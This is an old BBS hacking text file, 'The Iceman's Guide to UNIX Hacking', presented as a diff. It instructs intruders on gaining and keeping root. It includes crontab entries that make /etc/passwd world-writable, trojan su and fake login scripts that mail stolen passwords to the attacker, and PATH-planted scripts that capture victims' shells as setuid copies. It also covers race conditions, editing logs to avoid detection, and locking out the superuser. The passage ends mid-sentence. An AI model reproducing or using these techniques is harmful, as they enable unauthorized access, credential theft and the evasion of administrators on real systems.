@@ -1,0 +1,1319 @@
+
+File   : UNIXHACK.TXT
+Author : Iceman
+BBS    : The Banana Republic BBS
+
+
+Ver: 1.30             THE ICEMAN'S GUIDE TO UNIX HACKING          Updated:6/1/90
+                      ==================================          
+
+Introduction:
+=============
+
+    This file is definitely not for people who have never used UNIX before.  It
+assumes a working knowledge of UNIX as well as the principles behind it.  There
+are dozens of books around on UNIX - a good place to start is S.R. Bourne's
+'The UNIX System'.  Most of the technical information in this file was gleaned
+from the Bell Systems Technical Journal, the XINU and MINIX texts, the SYSV and
+Ultrix manuals, and sundry other books.
+    Note also that this document assumes you have some sort of access to a UNIX
+system.  There are quite a few files on getting into UNIX systems floating
+around; I won't bother rehashing them all.  This file tells you what to do once
+you are in.
+
+
+Logging In:
+===========
+
+    The easiest way to have fun with UNIX is to have a root shell - the super-
+user's shell.  Having done this, it is possible to create trapdoor programs
+that make it easy to get on later.  As super-user, you can patch the login
+program from source available to you on the system, to save every password to a
+secret file for your later enjoyment.  A big loophole in UNIX are executable
+logon names such as 'w' and 'date'. These can be identified in the password
+file /etc/passwd as having no password:
+
+    w::101:50:Print users on the system:/bin/:/bin/w
+
+Note the blank second field: No password.  You can get these login names to
+execute shell scripts: Once you have obtained root privileges, even if only
+temporarily, you can place an entry in the password file to run a script at
+login.  This script can be changed at ANY time to do exactly what you want.  To
+add a script called foo, create the entry:
+
+    foo::102:50::/:/usr/junk/foo
+
+where foo can be any shell script.  The reason this works is because getty
+(which prints the login prompt) is run by init, and the owner of init is root.
+That privilege is passed on to the script because it is being run at login
+time, and routines that run at login time usually need root access to perform
+necessary initializations.
+    A useful command to search the passwd file for all logins that don't have
+passwords is:
+
+    grep '^[^:]*::' /etc/passwd || echo "All logins protected (sigh)"
+    
+    A few bugs are also floating around very old versions of UNIX that give
+away root capability, for example if no user ID is specified in a user's entry
+in the passwd file, the user ID defaults to 0 or root.  An example is:
+
+    root::::Superuser:/:/bin/csh
+
+    Also, if the first line in the password file is a blank, you can login as
+root with no password.  Some system entries such as bin sometimes have no
+passwords, in which case you can logon as bin, and then edit /usr/lib/crontab
+to do a chmod on the password file, giving yourself access to it.  Just add
+something like:
+
+    * * * * *   chmod 666 /etc/passwd
+or
+    * * * * *   chmod a+rw /etc/passwd
+
+to the crontab file.  This will allow anybody to read or write the passwd file.
+Or you could put:
+
+    * * * * *   chmod 4777 /tmp/door
+
+giving yourself the trapdoor discussed elsewhere in this document.  This works
+because cron is executed by init, which is owned by root, so that any process
+run by cron has root privileges.  The asterisks tell cron to execute at the
+next possible moment.  Alternatively you can specify a time for it to run and
+do it at an off-peak time (after the superuser has gone home, when he is out to
+lunch etc).  The 4xxx sets the setuid bit (for more on file protection bits,
+see the section "Files" below), which allows the person executing the file to
+assume the same priviledge level as its owner, in this case root.  The x777
+part lets anyone run/access the file as for the passwd example.  You can also
+alter /etc/rc ("Run Commands") to change the password file.  This file is run
+auto- matically at startup to configure the system.  Again, all you have to do
+is wait for the system to be rebooted, which chmod's the password file, and
+then edit it.
+    cron can be quite useful for this sort of thing.  If you have write
+permision to a system directory, you can store a fake version of a system
+command that would be executed by cron in there, and then wait for the event
+that would cause it to be run.  The fake version would, of course, have some
+sort of trapdoor mechanism built into it.  On the distribution tape of 4.2BSD,
+for example, the /usr/spool/at directory is universally writeable by all users,
+making it a prime target for this method.  cron can also be valuable for giving
+yourself access to a system atfer the superuser has kicked you off.
+
+    A useful command for finding programs with the setuid/setgid bits on is:
+    
+    find <dir> \( -perm -4000 -o -perm -2000 \) -print | sort
+    
+    where dir is ant directory.  All of the subdirectories of this directory
+are recursively scanned.  Note that beacuse of this it is a real CPU hog.
+    Finally, some systems are distributed with default vendor-supplied
+passwords.  If the system was set up by inexperienced users, they will often
+overlook changing these default passwords.  A classic example of this was an
+early BSD release, which defaulted to no password for the root account on the
+distribution tape.
+
+Files:
+======
+
+    Each UNIX file has associated with it 11 bits, together with a user ID
+(UID) and group ID (GID).  Nine of the bits specify permission to read, to
+write, and to execute the file to its owner, to members of the owners group,
+and to all other users of the system.  The last two bits, called the set-UID
+and set-GID (SUID and SGID) bits, are referenced only when a file is executed
+as a program.  If the SUID bit it set, then the effective UID of the person
+running the program has all access priviledges of the program's owner.  The
+SGID bit works in a similar way for groups.  An example of a program that uses
+this SUI capability is the /bin/passwd program, used to change entries in the
+password file, which is not normally world-writeable.  To write to the password
+file, passwd must access /etc/passwd and change the users encrypted password
+stored there to the new version.  Thus all users are able to alter the
+sensitive /etc/passwd file, but only as permitted by /bin/passwd.  UNIX also
+recognises a special user, referred to as the super-user, with UID 0, who has
+unrestricted access to all files in the system regardless of ownership or
+protection configuration, and can execute priviledged system commands.  Anyone
+who has a UID or GID of 0 is treated by the system as root.
+    The most important files in a UNIX system from a hacking point of view are
+/etc/passwd, /etc/*rc, /usr/lib/crontab, and usr/lib/uucp/L.sys.  Files to
+watch for are ones with the SUID or SGID bits set.  You can modify these files
+to misuse the temporary root status to do all sorts of fun things, and then
+alter the date as described below so no-one will know.  An example of this is
+the /bin/passwd command described above.  /etc/passwd has its SUID bit set to
+/etc/passwd's owner, which is root, so while passwd is running, you have root
+privileges.  When the command terminates, so do the root privileges, unless you
+have altered the command in some way.  This is the classical trapdoor:  It is
+just another process, a clone of an ordinary user shell with one significant
+exception: The UID is 0, or root.  What happens is that when the trapdoor
+program is run, the program changes the effective UID to that of the owner of
+the file, ie root.  It then spawns a shell via the exec() call, and presto, one
+shell with root privileges.  Some points to watch for: The standard way to do a
+trapdoor is to have a program that acts as normal unless you call it with a
+wierd option such as '-xyzzy' (note that progs such as ls are no good for this
+as ls accepts virtually anything as some sort of valid switch).
+    A trap to fall into while playing with root is to generate an entry in a
+log file such a sulog.  uucp also keeps a log file.  Paranoid superusers may
+also get other progs to create logfile when used.
+
+
+SU:
+===
+
+    This command lets you substitute another UID for your own, but I don't
+recommend it as all su activity is recorded in a file called /usr/adm/sulog.
+As super-user you can edit this file, change the modification date, etc, but it
+just isn't worth the effort, as the superuser can also use ps to find out if
+anybody is using su. However it does have its advantages: By examining it you
+can at once identify any useful 'targets' on a system - anybody who can su to
+root is a worthwhile target for hacking activity.  The sulog is really a well-
+meaning (for systems administrators) but misguided attempt at security, as
+there are far safer methods to become root than with su, and yet it helps to
+identify potential targets for hacking.  Avoid su if you can.  (Anyway, to su
+to root you must have the root password anyway, so why stuff around with su
+when you can just login as root).  However, su does have one great advantage:
+It can be used to find out all the passwords used by other users of su.  The
+general program flow of su is:
+
+    Get info on user: uid, gid, password, tty,....
+    If the password is null or the uid is zero
+        Go past the password questions
+        
+    Prompt for the password
+    If the encrypted version of what was just typed doesn't match the 
+        /etc/passwd entry
+        
+        Log an unsuccessful su attempt
+        Print "sorry"
+        Exit
+        
+    Log a successful su attempt
+    Make the system calls to force uid and gid
+    Set up the environment if requested.
+    If you are not on the system console and this is a root shell
+        Log a message to the system console
+    Fix up argv to show su in a ps command
+    Exec a shell
+    
+    Obviously you will need to get rid of the logging of su in /usr/adm/sulog
+and to the console, and the fixing up of argv to show su in a ps command.  Also
+you would have to add checks for a "secret" password of your own so su bypasses
+the normal password checking sequence.  Finally, you would have to add extra
+code to log all passwords to su to be logged in a secret file, so that
+gradually you would obtain all the interseting passwords on the system.
+However, it would probably be a lot easier to patch login, since here there is
+no need to bypass the complicated logging of program use to various places.
+    An alternative is to create a dummy of the su command which saves the
+password in some obscure corner of the system, and then exits, removing all
+traces of itself.  The following shell script should do the trick:
+
+    stty -echo
+    echo -n "Password:"
+    read PASSWORD
+    echo " "
+    stty echo
+    echo $PASSWORD | mail <username>&
+    sleep 1
+    echo Sorry.
+    rm su
+    
+    
+Accounting Files:
+=================
+
+    The UNIX accounting file has a record of every process that runs on the
+system (you can find the exact structure in /usr/include/sys/acct.h).  One of
+the fields in this structure records the processess that have superuser
+capabilities.  When someone uses a root trapdoor, the processes they spawn are
+owned by root.  The accounting file takes the terminal number from which the
+process was run, so the superuser can look for root processes run from
+terminals that wouldn't normally be used by people authorized for root access.
+When processes have a UID different from that of the person running them, the
+accounting files can be very revealing.  Things that really make the superuser
+suspicious are shells with the su flag set - this is a dead giveaway of a
+trapdoor.  You can view your accounting info with:
+
+    acctcom -b -u$USER
+
+    Another interesting accounting file worth having a look at is
+/usr/adm/wtmp, which contains a record of all the logins since it was created.
+The file /etc/utmp contains info on users currently logged on (this file is
+used by the 'who' command).
+
+
+Unsuccessful Logins:
+====================
+
+    Some systems record unseccessful logins.  The login time, terminal, and
+username are stored, but unfortunately the password used is not recorded.
+However a reasonably common mistake is to type in a password when asked for a
+login name, or try to type too fast (because of people like me looking over
+their shoulders) and type in half the password at the end of the login line as
+you fumble for the return key.  At any rate, the end effect is that invariably
+a few passwords are collected along with login names in the logfile.  All that
+is necessary is to check all names in the login file with /etc/passwd - any
+name not in this but in the logfile has a good chance of being a password.
+    Some systems will count the number of consecutive unsuccessful login
+attempts for a particular user and disable the account after the number crosses
+a certain threshold.  This value is usually three attempts.  This is a marginal
+nuisance for would-be hackers, but is great for getting rid of the super-user:
+
+    login: root
+    Password: zot
+    
+repeated the appropriate number of times should ensure privacy for a while at
+least. 
+
+
+Physical Access to the Root Terminal:
+=====================================
+
+    Chances for this are rare; it is also very risky to be caught tampering
+with the super-users terminal, but anyway:  All you need to do from the
+superusers terminal is chmod to set the userid bit on your
+already-compiled-and-ready-to-go program just waiting to have the permissions
+changed.  If a terminal is left logged in as root at night while backups are
+performed, or if you can use the superusers office for some other legitimate
+activity and they leave for a few minutes, this is a golden opportunity not to
+be missed.
+
+    The standard booting operation for UNIX systems brings the system up in
+superuser mode, without requiring a login sequence or password.  During this
+time, the system identifies all commands as coming from root, so that anyone
+who can reboot the system can become root.  The only prerequisite to do this
+is, again, access to the system console.  Also, on some systems if the boot
+sequence is interrupted, they will drop into some sort of low-level monitor
+program.  However doing anything other than restarting the reboot from these
+monitors is generally painful.
+
+
+Capturing Shells:
+=================
+
+    Another neat trick is to get people to execute a command which saves a
+shell owned by them that you can run in some safe area.  A shell script to do
+this is:
+
+    #! /bin/csh -f
+    echo "#! /bin/csh -i">/tmp/$USER
+    chmod 4555 /tmp/$USER
+
+This saves a script to invoke an interactive shell in tmp/$USER (note you can't
+save it straight to your $HOME as this would involve giving the victim write
+access to it) which is executable by anybody and with the SUID bit set.  Thus
+you can "become" the victim at any time.
+
+
+Taking advantage of $PATH:
+==========================
+
+    Usually $HOME/bin is one of the first entries in the PATH variable.  If
+this is before /usr/bin, you can put a file in the victims /bin directory, such
+as ls, which will be executed instead of the standard ls.  Once they execute
+this ls, it will run with the same capability as the person running it.  An
+example fake ls shell script is:
+
+    echo "#! bin/csh -i" > /tmp/$USER
+    chmod 4555 /tmp/$USER
+    rm ls
+    `$1`
+
+    This is just the standard getshell presented above.  The `$1` passes the ls
+command on to the shell - this is necessary because if the victim types say 'ls
+-l' and the response is a simple 'ls' they will become a bit suspicious.  Note
+that the backquotes are necessary - they force the passing on of the typed
+command to the shell as is.  The 'rm ls' removes any suspicious evidence in the
+victims directory.
+    If the first entry in $PATH is '.' (eg $PATH=.:$HOME/bin:.....) then users
+will unwittingly execute programs in whatever directory they are in in
+preference to the usual system-wide command.  So it becomes a simple matter to
+create a directory with some tempting programs in it (games etc), give everyone
+acces to it, and then create a local version of, say 'ls', which is yet another
+getshell program, eg:
+
+    echo "#! bin/csh -i" > /tmp/$USER
+    chmod 4555 /tmp/$USER
+    `$1`
+    
+    These programs can be used in conjunction with SU (described above) to give
+superuser passwords but this is quite risky - it is doubtful whether any
+superuser will be fooled that easily.
+    An interesting point to note is that it is not necessary to explicitly
+put a . in $PATH.  Merely having two colons in a row (::) as part of $PATH, or
+even just one colon if it is at the start or end of $PATH, is enough to include
+rhe current directory in the search path.  Thus the following (somewhat
+exaggerated) PATH definition would search the current directory six times if
+the command was not found:
+
+    PATH=::/bin::usr/bin:.:/usr/ucb::
+        1 2     3        4          5 6
+
+    Finally, many systems programmers modify the root search path for their own
+convenience, and then forget that these same paths will be used by system
+maintenance scripts run automatically over night (see the section on using cron
+in "Logging In").  Sometimes people's .profile or .login files are
+world-readable, making it very easy to place dummy versions of commands in
+their way.
+
+Login Decoys:
+=============
+
+    The standard UNIX login sequence is as follows:
+    
+    First, init spawns getty ("Get Teletype"), which is initiated from the
+/etc/inittab file, on a specific tty number at a specific speed.  This sets up
+the line characteristics and prints the login prompt.  When a user types a
+login name, getty checks it for validity, then execs the login program.  Login
+prompts for the password, encrypts it, and checks it against the encrypted
+password in the /etc/passwd file.  If the passwords are the same string, login
+execs a shell that prints the shell prompts and reads your commands from the
+terminal.  The actual shell is determined from the passwd file, given by the
+entry for that login name.  There are several places in this chain open to
+attack, the best place being right at thet start, with getty.
+    When getty is waiting for a login, it prints the string in /etc/gettydefs.
+All you need to do is write a short program to put up a dummy of this, save the
+password off to some secure place, print an error message (the standard 'login
+incorrect' message), and then execute the standard login.  The following shell
+script should do the job:
+
+    echo -n "login: "
+    read NAME
+    stty echo
+    echo -n "Password: "
+    read PASSWD
+    echo ""
+    stty echo
+    echo $NAME $PASSWD | mail <your_address> &
+    sleep 1
+    echo "Login incorrect"
+    stty 0 > /dev/tty
+    
+    This simple script asks for your name, password, spawns a background
+process to mail them to you, waits for a while, and then announces a bad
+password to the victim and quits.  Note that this is meant as an example only -
+it should be written in C, with all signals to it disabled, to stop someone
+using ^C to break out into your shell - in that case you would become the
+victim.  Another alternative is to follow the suggestions in the section on
+shell fault handling.  Note also that you cannot simply leave a process running
+after you logoff - when you try to log off you will be warned that you still
+have a process running, and if you try to log off a second time it will be
+killed.  To bypass this, use the 'nohup' (no hang up) command.  This will
+prevent disconnecting (hanging up) the terminal from killing the process.  The
+format is:
+
+    nohup <command-list>
+    
+    The nohup command can also be faked with:
+    
+    trap " 1 2 3 15
+    exec "${@?}"
+    
+    The trap turns off the signals specified so that they are ignored by the
+subsequently created  commands, and the exec replaces the shell by the command
+specified as arguments.  Note that commands run with 'nohup' can also run
+invisibly in the background with an &.
+    
+    This can only be used to catch users on publicly used terminals though - I
+doubt any superusers could be fooled (even if you could get at their terminals,
+there are better things to do with them than play around with dummy logon
+shells).
+
+Password Aging:
+===============
+
+    Recent releases of UNIX have a neat feature called password aging, which,
+if enabled by the super-user, forces people to change their passwords every so
+often.  The idea behind this is that even if someone finds out a password, it
+will only be of use for a limited amount of time.  What happens is that when
+the password has expired, on logon the user is greeted by the message "Your
+password has expired. Choose a new one", and execution of the passwd command is
+forced rather than dumping the user into a shell as usual.  Also, to prevent a
+user from changing a password from X to Y and then promptly back to X again,
+passwd refuses to change a password that is less than one week old.
+    And now for the good part:  This system is (believe it or not) quite useful
+for hackers.  Because most users aren't expecting this sort of thing when they
+logon, they will have absolutely no idea of what to use as their new password.
+As a result, people will tend to come up with incredibly stupid passwords on
+the spur of the moment, with the intention of 'changing it later', but without
+any clear indication of exactly when 'later' is.  Also, if the new password is
+discovered, it cannot be changed for a WHOLE WEEK by the user - plenty of time
+for having all the fun you want with that account.  Another point is that even
+if users do use reasonably nontrivial passwords, all that the ageing will
+generally make them do is toggle between two passwords - if you know both
+you're fine.
+    Obviously this feature is a prime target for a login decoy type program -
+an expired password is a perfectly valid reason for forcing a user to retype a
+password - far more valid than "line noise" or a "typing error".  However you
+must then be careful to *really* change the expired password or the victim may
+become just a bit suspicious.  It is also possible to scan the /etc/passwd and
+check for expiry dates of passwords - in the current implementation it is
+stored in an encoded, but not encrypted, format just after the encrypted
+password.  With this method you can instantly find all expired accounts, and
+also find out how long various accounts have to go before they expire.  However
+merely reactivating an expired account is not too safe as the real owner may
+turn up and wonder why his password no longer works and/or why he doesn't at
+least get the 'expired' message.
+    Some newer systems also require a certain format for passwords, eg at least
+6 characters, or at least 6 letters and one digit.  Some earlier versions of
+passwd allowed any-length passwords on the second attempt at running passwd,
+but this has been removed in more recent releases.  The effect of the 1-digit
+rule is that people append a digit in the range 0-9 at the ends of their
+passwords, so all that is required is that you try the same password with
+10-digit variations instead of just typing it in straight.  It is interesting
+to note that in a recent study of super-user passwords on systems that used
+this sort of password style, the most common 20 female names followed by a
+digit in the range 0-9 (ie 200 tries per password) gave access to quite a few
+systems.  Now that's a super-user password just by guessing (so it's quite a
+bit of typing, but it also doesn't involve any of the somewhat risky acrobatics
+described elsewhere in this document).
+
+
+Setuid Shell Scripts:
+=====================
+
+    An easy way to achieve superuser capabilities is through the use of setuid
+shell scripts.  For the Bourne shell, the first line of a script will be:
+
+    #!/bin/sh
+    
+    What happens is that the kernel discovers the magic number #! and tries to
+execute the command interpreter pointed out, which may be followed in the
+script by one argument.  Before the exec() of the interpreter, the UID and GID
+fields somewhere in the user structure of the process are filled in.  In C, the
+process carried out is:
+
+    execl("/bin/foo", "foo", (char *) 0);
+    
+    which comes to:
+    
+    setuid(0);
+    setgid(0);        /* Possibly */
+    execl("/bin/sh", "sh", "/bin/foo", (char *) 0);
+    
+    All that is necessary is to make the name of the script equal -i, which can
+be done by linking the script to a file named -i.  Thus the exec() becomes:
+
+    execl("/bin/sh", "sh", "-i", (char *) 0);
+    
+    which creates an interactive shell with UID 0.
+
+    For the csh, the process is somewhat different.  The csh refuses to run a
+setuid script unless the -b ("break") option is present.  What the -b option
+does is try to prevent the above from happening, ie it prevents following
+arguments of an exec of /bin/csh from being interpreted as options.  However
+there is still a way to get around this problem, albeit not a particularly easy
+one.  The idea is to get in between the setuid()/setgid(), and the open() of
+the command file by the command interpreter, and quickly unlink() the link to
+the setuid shell shell script and then link() in some other shell script.
+Another possibility is the creative use of the $PATH variable as described in
+the section "Taking Advantage of $PATH".
+
+    The idea of getting in between system calls in a program can be extended to
+other setuid programs as well.  For example, the mkdir command, which is a
+setuid program owned by root, works by first creating the inode for a directory
+with the mknod() system call, followed by a chown() to change the owner from
+root to its real owner.  In this case all that is needed is to remove the
+directory inode and make a link to the password file under the name of the
+directory.  Then, when the chown() call is executed, the user becomes the owner
+of the password file.
+    While in theory this would seem to take incredible luck, it is in fact a
+relatively simple matter to create a shell script which performs some action to
+slow the system to a crawl, while at the same time repeatedly trying the above
+methods.  A suitable means of slowing the system down is via the mail daemon -
+create a process which sends yourself endless zero length messages (but don't
+overdo it - I once caused a minor panic through runaway mailing which
+overflowed several internal tables used by the system, at which point the
+process was killed by a seperate safety-net watchdog process).
+
+
+Some brief notes on other methods:
+==================================
+
+    False tape release: Rather obscure: Get hold of an old update tape, patch
+it, send it to the superuser, and hope they use the 'updates' on the tape
+without getting too suspicious.
+
+    Passwd encryption: The algorithm used is the DES (Data Encryption Standard)
+algorithm with an added twist: one of 4096 variants is chosen, dependant on two
+randomly generated chars called 'salt' in the /etc/passwd file.  You could grab
+a password, use its salt and encrypt a list of known passwords.  If the result
+matches the sample password, you're in.  This is a lot of work, and also
+involves a lot of use of the system command crypt.  This command is specially
+designed to chew up enough CPU time to make it very inconvenient for repeated
+use.  Also repeated use of it will probably attract the superuser.  One way in
+which this method can be used is to encrypt a sample of possible passwords on a
+secure, and preferably fast, system (such as the Cray you broke into last
+week), and then use the pre-encrypted passwords on the target system.  Another
+way is to create you own program to pre-encrypt passwords at high speed on your
+own system for later use, a method I use frequently.
+
+    Mount command: Only good on floppy systems.  Get a system on which you can
+become superuser, make a trapdoor and put it on a disk, take the disk to the
+target system and mount the file.  You now have a file with superuser access
+(this is about the only thing PC-UNIX is good for.....).  This is sometimes
+protected against by making mount restricted, or not allowing the mounting of
+setuid files.
+
+    Source code patches: Patch passwd, chown and chmod (to not check if you
+have a uid of 0), crypt, su (to not update sulog), ps (to not show root
+accesses) etc.  A lot of work, and far too complex to explain here (it involves
+getting the source, compiling it, becoming root, swapping the files, resetting
+any dates/log entries etc, as well as just plain doing the patching.  How do
+you test a program that needs to be run in superuser mode without running it in
+superuser mode?  Catch 22).
+
+    Reading supposedly blank memory pages/disk space: Many systems do not erase
+newly allocated memory pages or disk space, and they can be full of interesting
+information left there by the previous owner.  Note, however, that it is not
+possible to acquire passwords in this manner - the nature of the DES encryption
+ensures that the password is never stored internally in any decrypted form.  A
+related technique is that of modifying data structures that are stored in user
+space.  Often, programs will build up complex data structures to access
+streams.  As the stream is written or read, the system updates these
+structures.  Changing these structures can have some interesting effects.  A
+good idea is to look at the files in /usr/include/sys/*.h for details of these
+data structures.
+
+    Taking advantage of trusted logins: One of the most useful features of BSD
+UNIX systems is the ability to execute tasks on remote machines.  To avoid
+having to repeatedly type passwords to access remote accounts, it is possible
+for a user to specify a list of host/login name pairs that are assumed to be
+trusted, in the sense that a remote login from that host/login pair is never
+asked for a password.  The files /etc/hosts.equiv, /.rhosts, and $USER/.rhosts
+contain lists of trusted systems.  Quite often, these machines and accounts are
+set up for reciprocal trust.  In this manner, it is a relatively easy matter to
+first obtain access to a less-trusted system, and from there migrate onto more
+secure systems, without having to go through the usual rigmarole to bypass
+security measures.
+
+    Resource exhaustion: Very little protection is offered against excessive
+consumption of resources by users.  Therefore it is possible to degrade system
+performance, or even halt it altogether, by exhausting such resources as
+inodes, disk storage, files, processes, and swap space.  The only real use for
+this is mentioned in the section "Setuid Shell Scripts".  A related method is
+to feed invalid parameters to programs, which are often not set up to handle
+them properly (for more on this see "Advanced Techniques").
+
+    Create a pseudo-device: In the file /etc/master or /usr/sys/conf/master is
+a table of all the device driver names associated with each primitive.  To
+create a pseudodevice, put a new entry in the device driver table (the table
+names the routines that support the primitives).  The open() syscall then calls
+the device driver, and since the open() call was in system mode, the device
+driver also runs in system mode.  From there it's up to you (if you can write a
+UNIX device driver then getting on from this point is child's play).
+
+    Impersonate a remote uucp node: Details of uucp are given in the "Tricks
+with UNIX Comms" section below.  Basically it involves looking in the
+/usr/lib/uucp/L.sys file for logins for remote systems.  Then look in
+/etc/passwd for logins that run uucico progs rather than a regular shell.  Then
+change the node name of your UNIX system to the node name of the remote system
+to impersonate, login under uucp or the special login name described above.
+uucp will give the (fake) node name to the target system.  You can then
+transfer progs, mail etc back and forth.  If you plan to do this on a regular
+basis, remember to forward the mail to the system you are impersonating
+otherwise the administrators of both systems may become suspicious.  It should
+also be possible to export setuid files the the target system, providing yet
+another potential source for trapdoors.
+
+    Remove the password file: Some early UNIX systems had a subtle bug whereby
+the lpr utility, if invoked with a switch that told it to remove the file after
+printing it, would remove any file, including the password file.  This then
+allows you to log in without a password.  Note that this method, while sounding
+pretty drastic, is actually quite effective:  Just save a copy of the password
+file somewhere beforehend, and then restore it once you have become the
+superuser.
+
+    Overwrite the password file: Similar to the above (and also fixed in more
+recent UNIX systems), this method involves linking a file called core to the
+password file, and then forcing a core dump of a setuid program, which the
+system will write on the core file, or in other words over the top of the
+passwd file.  In this way, it is possible to replace the passwd file with one
+containing a few strings of your own choosing (for example command arguments).
+
+    Look for all manuals that say "Do not do X".  Try as many variations of X
+as possible.
+
+    Forging mail: This is not really a 'real hacking' method, and is also
+pretty well known and usually protected against:  In SYSV (but not XENIX System
+III or BSD 4.2) your can change LOGNAME to any name, and mail will then use
+this as your USERname.  Of course of you are root you can just use sendmail
+<dest> -r<alias> or -f<alias> to send mail supposedly from whoever you want.
+There are several other holes in sendmail; however, the latest release (BSD
+5.61) purports to fix all previously known problems.
+
+
+Shell Fault Handling:
+=====================
+
+    Shell procedures such as the ones described above nornally terminate when
+an interrupt is received from the terminal.  The "trap" command can be used to
+handle these interrupts, for example:
+
+    trap 'halt -q -n' 2
+    
+    sets a trap for signal 2 (terminal interrupt), and if this signal is
+received will execute the command 'halt -q -n', which will crash-halt the CPU.
+Signals can be handled in one of three ways:  They can be ignored, in which
+case the signal is never sent to the process; they can be caught, in which case
+the process must decide what action to take when the signal is received; or
+they can be left to cause termination of the process without the process having
+to take any further action.  A procedure can trap all signals by makng the null
+string the argument to trap.  The following:
+
+    trap " 1 2 3 15 
+    
+    causes hangup, interrupt, quit, and kill to be ignored both by the
+procedure and by the invoking commands.  Traps may be reset simply by saying:
+
+    trap 1 2 3 15
+    
+    which will reset the traps for the above signals to their normal values.  A
+list of the current values of traps may be obtained by using trap with no
+arguments.  
+    The signals available under UNIX are:
+    
+    1 SIGHUP
+      A hangup from the terminal.  Usually results from a loss of carrier over
+      a phone line and can also be generated using:
+      
+        stty 0 > /dev/<tty_no>
+        
+    2 SIGINT
+      Terminal interrupt (^C).
+      
+    3 SIGQUIT
+      Quit.  This is the usual way to terminate a program when a core dump is
+required. 
+
+    4 SIGILL
+      Illegal instruction.
+      
+    5 SIGTRAP
+      Trace trap (used by the debugger 'adb').
+      
+    6 SIGIOT
+      IOT instruction (also used by 'adb').
+      
+    7 SIGEMT
+      EMT instruction - used on some machines for FP emulation.
+      
+    8 SIGFPE
+      FP exception.
+      
+    9 SIGKILL
+      Kill.  This signal can be safely used to get rid of and of your processes
+      It cannot be caught or ignored by any process.  Note that you can only
+      kill your own processes, and not anybody elses, and that because of this
+      there is no danger of any other user breaking out of say a decoy login
+      shell script, since kill cannot be generated from the keyboard.  It must
+      be sent with the 'kill' command, eg:
+      
+        kill -9 <pid>
+        
+    10 SIGBUS
+      Bus error - usually caused by illegal pointer indirection.
+      
+    11 SIGSEGV
+      Segmentation violation - caused by an illegal pointer reference, array
+      bounds error, or stack overflow.
+      
+    12 SIGSYS
+      Bad argument to a system call.
+      
+    13 SIGPIPE
+      Write to a broken pipe.
+      
+    14 SIGALRM
+      Alarm clock.  This is generated following the 'pause' system call.
+      
+    15 SIGTERM
+      Software termination signal.  This signal is the default for the 'kill'
+      command (mentioned above), and allows the process receiveing it to clean
+      up temporary files and exit gracefully.  If this fails, a 'kill -9'
+      should be used.
+
+
+UNIX I/O:
+=========
+
+    UNIX talks to peripherals with "special files", which may be found in the
+/dev directory.  Block devices such as /dev/hd0 use buffered I/O, char- acter
+devices such as /dev/tty00 use character I/O.  Typical devices are:
+
+    /dev/tty        Terminal
+    /dev/rmt        Tape drive/backup
+    /dev/fd         Floppy
+    /dev/hd         Hard drive (block device)
+    /dev/rhd        Raw char. device
+
+    Note that all system resources are accessed in this way, even memory (as
+/dev/mem), and the kernel (/dev/kmem).  Examining these files with a 'ls -l'
+will produce two numbers, the major and minor device numbers.  The major number
+is an index in the cdevsw[] table that contains the address of the device
+driver used by the kernel for that type of device, the minor number is an id
+for the particular device involved.  The numbers appear in sequential order for
+the devices that use the same driver.
+
+
+Tricks with Terminals:
+======================
+
+    Because a terminal is treated as a file, it has permissions just like
+everything else.  To keep people from writing to your terminal, just use chmod
+600 <tty_path>, or the easier-to-remember 'mesg n'.  There are some nice tricks
+you can do with terminals.  If someone has their write-protection turned off,
+you can run a file like:
+
+    while :
+    do
+        clear > /dev/tty<number>
+    done &
+
+which is a background process which continually clears the victims screen.
+    You can go further than this, however.  Whenever you open a file, you get a
+file descriptor back, which you can then use in the ioctl system call.
+Obtaining that file descriptor is the magic bit - you now have a key to that
+person's terminal interface.  Any ioctl alterations made to that file
+descriptor take effect immediately, and you can read things being written/read
+at that terminal, and even trick the terminal into executing commands for you.
+An example of this is the ANSI escape sequence ESC ] <command> <delimiter>,
+which when sent will execute a command as if it were coming from the remote
+terminal.  The person using the terminal may never find out what is going on!
+An interesting feature of UNIX is that once you open a device (in this case a
+terminal) then you still have read/write access to it even if the owner of the
+device turns off permission, and continue to have access until you close the
+device.  However, once you have closed it you won't have access to it any more.
+There are exceptions even to this rule, however:  In networks, some
+workstations may cache parts of the filesystem locally.  On one system I know
+of, if the remote file is updated the locally cached version is not, thus
+allowing access at the "old" access level until the cache is updated.
+
+    It is also possible to use the UNIX I/O redirection facilities to play all
+sorts of tricks with terminals.  Under the shell, it is possible to redirect
+I/O to and from file descriptor by prefixing them with an '&'.  Thus the
+command:
+
+    cat <file> > &<digit>
+    
+    will send the file <file> to the file descriptor <digit>.  It does this by
+duplicating the file descriptor using the 'dup' system call, and then using the
+result as the standard output.  Normally the standard output/input is
+designated by '-'.  Thus it is possible with the commands:
+
+    <&-
+and
+    >&-
+    
+    to close the standard input and output respectively.
+    Note that since terminals are files, they have access/modify/create time-
+stamps on them as described int the "Time Stamps on Files" section.  These are
+stored in the inodes as three longints, and can be used to, for example, find
+the last time a person typed something on their terminal with 'who -u', which
+uses the stat() system call to find the modification time of the device file.
+If the terminal has been used in the last minute, a '.' is shown for that
+terminal, if it hasn't been used for 24hrs the string 'old' is printed,
+otherwise the time the terminal was last used is printed in HH:MM format.
+
+
+Tricks with File Systems:
+=========================
+
+    Only a few brief notes here as you usually won't do any of this:
+
+To find out how much disk space is being used by files in a directory and
+(recursively) in all its subdirectories, use the "du" command.  The output from
+du is a list of file or directory names and the associated number of 512-byte
+blocks used.  There is a similar command, "df", which prints the number of
+blocks in each filesystem, a block being typically 512 or 1024 bytes.
+
+To access a physical partition on a disk as a block device, you must first
+create a filesystem on it.  This is done with the mkfs command:
+
+    mkfs /dev/hd<number> <size in K>
+eg
+    mkfs /dev/hd08 8000
+
+will create an 8MB filesystem as hd08.  This file system now contains the
+superblock, free lists, etc, everything needed to keep track of the files that
+live there.  Now you must mount the filesystem with the command:
+
+    mount /dev/hd<number> /mount_point
+
+Files can now be placed in this disk partition with the usual cp, mv commands,
+mkdir used etc etc.  Why you would want to go to all this trouble is beyond me
+(you also have to be superuser to do this sort of thing).
+    To use a filesystem as raw storage rather than as a block device, use the
+device file that has the character device name that starts with 'r'.  For
+example to use the same device as the one used in the previous example as a raw
+device, use the name '/dev/rhd01'.  If you examine this device with 'ls -l',
+you will notice that the permission bits start with 'crw' rather than 'brw',
+indicating that it is a character rather than a block device.  The device has
+no filesystem in it, and is just an expanse of bytes, used to back up data.
+    A useful system variable is ulimit.  This sets the max size of file you (or
+your victim) can create.  If you set this to 0, the victim can't create ANY
+files at all until they logout and log on again.  You can either use this to
+force them to log off so you can capture their password when they log on again,
+or just to be a nuisance by putting it in their logon script (most people won't
